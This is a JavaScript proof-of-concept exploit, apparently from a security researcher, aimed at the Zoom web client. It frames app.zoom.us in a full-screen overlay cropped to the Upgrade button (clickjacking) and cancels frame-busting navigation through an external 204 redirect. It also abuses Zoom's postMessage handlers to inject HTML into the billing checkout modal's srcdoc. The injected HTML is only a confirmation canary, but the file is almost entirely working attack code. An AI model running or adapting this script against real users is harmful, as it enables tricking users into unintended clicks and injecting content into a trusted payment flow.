(() => {
  const ZOOM = "https://app.zoom.us";
  const ZOOM_URL = `${ZOOM}/wc/home`;
  const CANCEL_204 =
    "https://zoom-204-vercel.vercel.app/204-cancel-navigation";

  const HOST_ID = "zoom-clickable-postmessage-crop";
  const OLD_IDS = [
    "zoom-visual-crop",
    "zoom-visual-click-blocker",
    "zoom-frame-poc"
  ];

  // Previously measured Zoom layout at a 1034 x 962 iframe viewport.
  const SOURCE = Object.freeze({
    width: 1034,
    height: 962,
    upgradeX: 844.8515625,
    upgradeY: 15.5,
    upgradeWidth: 85.1484375,
    upgradeHeight: 32
  });

  const CANARY_HTML =
    '<!doctype html><meta charset="utf-8"><body style="margin:0;min-height:100vh;display:grid;place-items:center;font:24px system-ui;background:#f3f7ff"><main style="padding:48px;border:4px solid #2d6cdf;border-radius:20px;background:#fff;text-align:center"><h1>DEVFORUM_IFRAME_POSTMESSAGE_CONFIRMED</h1><p>One-shot static HTML canary.</p></main></body>';

  const PATHS = [
    "__billingActiveCheckoutModal.instance.modalDom.children.0.children.1.children.1.children.1.srcdoc",
    "__billingActiveCheckoutModal.instance.modalDom.children.0.children.0.children.1.children.1.srcdoc"
  ];

  // Cleanup prior runs.
  window.__zoomMergedClickable?.stop?.();
  window.__zoomPoc?.stop?.();
  window.__zoomReliable?.stop?.();

  OLD_IDS.forEach(id => document.getElementById(id)?.remove());

  if (window.__zoomBeforeUnload) {
    removeEventListener("beforeunload", window.__zoomBeforeUnload);
    window.__zoomBeforeUnload = null;
  }

  if (!document.body) {
    throw new Error("Run after document.body exists.");
  }

  let stopped = false;
  let guardArmed = false;
  let guardUsed = false;

  // One-shot 204 navigation guard.
  const onBeforeUnload = () => {
    if (!guardUsed) guardArmed = true;
  };

  addEventListener("beforeunload", onBeforeUnload);

  const guardTimer = setInterval(() => {
    if (stopped || !guardArmed || guardUsed) return;

    guardUsed = true;
    guardArmed = false;

    clearInterval(guardTimer);
    removeEventListener("beforeunload", onBeforeUnload);

    window.top.location.href = CANCEL_204;
  }, 1);

  // Create stable crop host.
  const host = document.createElement("div");
  host.id = HOST_ID;

  // Create clickable Zoom iframe.
  const iframe = document.createElement("iframe");
  iframe.src = ZOOM_URL;
  iframe.title = "Clickable Zoom Upgrade crop";
  iframe.tabIndex = 0;

  host.appendChild(iframe);
  document.body.appendChild(host);

  const setStyle = (element, property, value) => {
    if (element.style[property] !== value) {
      element.style[property] = value;
    }
  };

  const apply = () => {
    if (stopped) return;
    if (!host.isConnected) document.body.appendChild(host);

    const viewportWidth = Math.max(
      1,
      document.documentElement.clientWidth
    );

    const viewportHeight = Math.max(
      1,
      document.documentElement.clientHeight
    );

    const scaleX = viewportWidth / SOURCE.upgradeWidth;
    const scaleY = viewportHeight / SOURCE.upgradeHeight;

    setStyle(host, "position", "fixed");
    setStyle(host, "inset", "0px");
    setStyle(host, "overflow", "hidden");
    setStyle(host, "zIndex", "2147483647");
    setStyle(host, "pointerEvents", "none");
    setStyle(host, "background", "transparent");
    setStyle(host, "visibility", "visible");

    setStyle(iframe, "position", "absolute");
    setStyle(iframe, "left", "0px");
    setStyle(iframe, "top", "0px");
    setStyle(iframe, "width", `${SOURCE.width}px`);
    setStyle(iframe, "height", `${SOURCE.height}px`);
    setStyle(iframe, "border", "0px");
    setStyle(iframe, "margin", "0px");
    setStyle(iframe, "padding", "0px");
    setStyle(iframe, "maxWidth", "none");
    setStyle(iframe, "maxHeight", "none");
    setStyle(iframe, "transformOrigin", "0px 0px");
    setStyle(iframe, "pointerEvents", "auto");
    setStyle(iframe, "touchAction", "auto");
    setStyle(iframe, "userSelect", "none");
    setStyle(iframe, "background", "#fff");
    setStyle(iframe, "opacity", "1");
    setStyle(iframe, "visibility", "visible");

    setStyle(
      iframe,
      "transform",
      `translate(${-SOURCE.upgradeX * scaleX}px, ${
        -SOURCE.upgradeY * scaleY
      }px) scale(${scaleX}, ${scaleY})`
    );
  };

  const listeners = [
    [window, "resize", apply],
    [window, "orientationchange", apply],
    [document, "fullscreenchange", apply]
  ];

  listeners.forEach(([target, type, handler]) => {
    target.addEventListener(type, handler, { passive: true });
  });

  if (window.visualViewport) {
    window.visualViewport.addEventListener("resize", apply, {
      passive: true
    });

    window.visualViewport.addEventListener("scroll", apply, {
      passive: true
    });
  }

  const resizeObserver = new ResizeObserver(apply);
  resizeObserver.observe(document.documentElement);

  const mutationObserver = new MutationObserver(apply);
  mutationObserver.observe(document.documentElement, {
    attributes: true,
    childList: true,
    subtree: true,
    attributeFilter: ["style", "class"]
  });

  const repairTimer = setInterval(apply, 500);

  // PostMessage state from the second script.
  const state = (window.__zoomMergedClickable = {
    host,
    iframe,
    apply,
    token: crypto.randomUUID(),
    ready: false,
    handler: null,
    stop: null
  });

  const inject = () => {
    if (!state.ready || !iframe.isConnected) return;

    for (const objectPath of PATHS) {
      iframe.contentWindow.postMessage({
        type: "mc_safe_set",
        objectPath,
        value: CANARY_HTML
      }, ZOOM);
    }

    setTimeout(() => {
      iframe.contentWindow.postMessage({
        type: "mc_hiddenLoading"
      }, ZOOM);
    }, 75);
  };

  state.handler = event => {
    if (
      state.ready ||
      event.source !== iframe.contentWindow ||
      event.origin !== ZOOM ||
      event.data?.type !== "ZOOM_IFRAME_READY" ||
      event.data?.token !== state.token
    ) return;

    state.ready = true;
    clearInterval(state.probeTimer);

    console.log("Zoom listener ready; clickable crop active");

    state.injectTimer = setInterval(inject, 350);
    inject();

    state.retryTimer = setTimeout(() => {
      clearInterval(state.injectTimer);
      console.log("PostMessage retry window ended");
    }, 120000);
  };

  addEventListener("message", state.handler);

  const probe = () => {
    if (!iframe.isConnected) return state.stop();

    iframe.contentWindow.postMessage({
      type: "mc_safe_call",
      objectPath: "parent.postMessage",
      args: [{
        type: "ZOOM_IFRAME_READY",
        token: state.token
      }, location.origin]
    }, ZOOM);
  };

  state.probeTimer = setInterval(probe, 300);
  iframe.addEventListener("load", probe);
  probe();

  state.stop = () => {
    if (stopped) return;
    stopped = true;

    clearInterval(guardTimer);
    clearInterval(state.probeTimer);
    clearInterval(state.injectTimer);
    clearTimeout(state.retryTimer);
    clearInterval(repairTimer);

    resizeObserver.disconnect();
    mutationObserver.disconnect();

    removeEventListener("beforeunload", onBeforeUnload);

    if (state.handler) {
      removeEventListener("message", state.handler);
    }

    listeners.forEach(([target, type, handler]) => {
      target.removeEventListener(type, handler);
    });

    if (window.visualViewport) {
      window.visualViewport.removeEventListener("resize", apply);
      window.visualViewport.removeEventListener("scroll", apply);
    }

    host.remove();

    if (window.__zoomMergedClickable === state) {
      delete window.__zoomMergedClickable;
    }
  };

  iframe.addEventListener("load", apply);
  apply();

  console.log("ZOOM_CLICKABLE_POSTMESSAGE_CROP_ACTIVE");
  return "ZOOM_CLICKABLE_POSTMESSAGE_CROP_ACTIVE";
})();
